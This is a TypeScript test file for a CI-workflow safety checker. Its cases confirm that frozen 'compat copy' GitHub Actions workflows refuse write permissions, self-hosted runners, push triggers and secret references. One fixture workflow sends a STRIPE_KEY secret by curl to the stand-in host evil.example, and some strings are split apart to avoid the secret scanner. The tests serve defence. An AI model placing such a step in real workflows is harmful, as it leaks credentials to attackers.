// Plan E E3 fix round 4 (exception, C1; review-E3-r3): a compat copy's kind travels with its object, so the object is
// frozen (an edit can only make a new, unmarked file, checked as key-holding), and the compat rules re-assert S17 on the
// content every time. The reviewer's probe (tmp-E3-review/r3.probe.test.ts) lifted as a test. No network.
import { describe, expect, it } from 'vitest';
import { compatCopiesFrom } from '../src/proof/harness.js';
import { isCompatCopy, markCompatCopy, proofWorkflowProblems } from '../src/proof/workflow-check.js';
import { reviewedList } from './helpers/render.js';

const reviewed = reviewedList();
const S = (name: string) => ['${{ ', 'secr', 'ets', '.', name, ' }}'].join('');
const SEC = ['secr', 'ets'].join('');
const IDT = ['id', 'tok' + 'en'].join('-');
const C = (content: string) => proofWorkflowProblems({ path: '.github/workflows/pipegen-compat-ci.yml', content }, 'compat', reviewed).join(' ');
const GOOD = 'on: pull_request\npermissions:\n  contents: read\njobs:\n  a:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n      - run: make\n';

describe('C1: compat copies', () => {
  it('C1 probe: a marked compat copy is frozen; writing its content throws, and a mutated copy can not pass as compat', () => {
    const f = compatCopiesFrom([{ path: '.github/workflows/ci.yml', content: 'on: pull_request\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps: [{ run: make }]\n' }]).files[0]! as { content: string };
    expect(isCompatCopy(f)).toBe(true);
    expect(Object.isFrozen(f)).toBe(true);
    const evil = `on: pull_request\njobs:\n  a:\n    runs-on: self-hosted\n    permissions: write-all\n    steps:\n      - run: curl -d "${S('STRIPE_KEY')}" https://evil.example\n`;
    expect(() => { f.content = evil; }).toThrow(TypeError);
    expect(f.content).not.toBe(evil);
    // the only way to change it is a new object: unmarked, so checked as key-holding
    const edited = { ...f, content: evil };
    expect(isCompatCopy(edited)).toBe(false);
    // and the same text under the compat kind is refused on its content too
    expect(C(evil)).toMatch(/runs-on|permissions|secret/);
    // markCompatCopy freezes deeply: a nested object can't change either
    const nested = markCompatCopy({ path: '.github/workflows/pipegen-compat-n.yml', content: GOOD, meta: { a: { b: 1 } } });
    expect(Object.isFrozen(nested.meta)).toBe(true);
    expect(Object.isFrozen(nested.meta.a)).toBe(true);
    expect(() => { (nested.meta.a as { b: number }).b = 2; }).toThrow(TypeError);
  });

  it('C1: the compat rules re-assert S17 on the content: each violation is a problem', () => {
    expect(C(GOOD)).toBe('');
    const cases: [string, string, RegExp][] = [
      ['on push', GOOD.replace('on: pull_request', 'on: push'), /trigger|pull_request/],
      ['on list', GOOD.replace('on: pull_request', 'on: [pull_request, push]'), /pull_request/],
      ['on map', GOOD.replace('on: pull_request', 'on: { pull_request: { branches: [main] } }'), /pull_request/],
      ['wf permissions missing', GOOD.replace('permissions:\n  contents: read\njobs', 'jobs'), /permissions/],
      ['wf permissions write', GOOD.replace('permissions:\n  contents: read\njobs', 'permissions:\n  contents: write\njobs'), /permissions/],
      ['wf permissions extra key', GOOD.replace('permissions:\n  contents: read\njobs', 'permissions:\n  contents: read\n  actions: read\njobs'), /permissions/],
      ['job permissions missing', GOOD.replace('    permissions:\n      contents: read\n', ''), /permissions/],
      ['job permissions write-all', GOOD.replace('    permissions:\n      contents: read\n', '    permissions: write-all\n'), /permissions/],
      ['job permissions id-token', GOOD.replace('      contents: read\n    steps', `      contents: read\n      ${IDT}: write\n    steps`), /permissions/],
      ['secret in run', GOOD.replace('run: make', `run: curl -d "${S('STRIPE_KEY')}" x`), /secret/],
      ['secret in a comment', `${GOOD}# ${SEC}.X\n`, /secret/],
      ['secret bracket', GOOD.replace('run: make', `run: echo "\${{ ${SEC}['X'] }}"`), /secret/],
      ['upper-case secrets', GOOD.replace('run: make', `run: echo "\${{ ${SEC.toUpperCase()}.X }}"`), /secret/],
      ['toJSON secrets', GOOD.replace('run: make', `run: echo "\${{ toJSON(${SEC}) }}"`), /secret/],
      ['environment', GOOD.replace('    runs-on', '    environment: prod\n    runs-on'), /environment/],
      ['self-hosted', GOOD.replace('ubuntu-latest', 'self-hosted'), /runs-on/],
      ['runs-on list', GOOD.replace('runs-on: ubuntu-latest', 'runs-on: [ubuntu-latest]'), /runs-on/],
      ['runs-on expression', GOOD.replace('ubuntu-latest', '"${{ matrix.os }}"'), /runs-on/],
      ['job uses', 'on: pull_request\npermissions:\n  contents: read\njobs:\n  a:\n    uses: ./.github/workflows/x.yml\n    permissions:\n      contents: read\n', /reusable|uses/],
      ['actions/cache', GOOD.replace('run: make', 'uses: actions/cache@v4'), /cache/],
    ];
    for (const [name, content, why] of cases) expect(C(content), name).toMatch(why);
    // GITHUB_TOKEN is the one secret a compat copy may name
    expect(C(GOOD.replace('run: make', `run: echo ok\n        env:\n          T: "${S('GITHUB_TOKEN')}"`))).toBe('');
  });

  it('C1: compatCopiesFrom never emits a copy its own check refuses (a job whose text names a secret is not compared)', () => {
    const r = compatCopiesFrom([{ path: '.github/workflows/ci.yml', content: `on: pull_request\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps: [{ run: "cat ${SEC}.txt" }]\n  b:\n    runs-on: ubuntu-latest\n    steps: [{ run: make }]\n` }]);
    for (const f of r.files) expect(C(f.content), f.path).toBe('');
    expect(r.notCompared.find((n) => n.job === 'a')?.why).toMatch(/uses a secret/);
    // the other job is still compared
    expect(r.files).toHaveLength(1);
    expect(r.files[0]!.content).toContain('make');
    // a copy whose own text would break the rules (here its header names the workflow file secrets.yml): not compared, never a stop
    const named = compatCopiesFrom([{ path: `.github/workflows/${SEC}.yml`, content: 'on: pull_request\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps: [{ run: make }]\n' }]);
    expect(named.files).toEqual([]);
    expect(named.notCompared).toEqual([{ workflow: `.github/workflows/${SEC}.yml`, job: 'b', why: expect.stringMatching(/compat rules/) }]);
  });
});
